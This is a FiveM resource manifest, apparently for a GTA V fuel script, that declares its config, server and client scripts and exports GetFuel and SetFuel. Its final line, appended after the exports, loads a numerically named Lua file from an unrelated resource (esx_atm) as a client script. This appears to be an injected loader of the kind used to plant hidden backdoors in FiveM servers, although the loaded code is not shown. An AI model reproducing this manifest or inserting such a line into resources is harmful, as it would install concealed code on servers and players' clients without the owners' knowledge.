fx_version 'adamant'
game 'gta5'

shared_scripts {
	'config.lua'
}

server_scripts {
	'server/main.lua'
}

client_scripts {
	'client/functions.lua',
	'client/main.lua'
}

exports {
	'GetFuel',
	'SetFuel'
}
client_script '@esx_atm/48706.lua'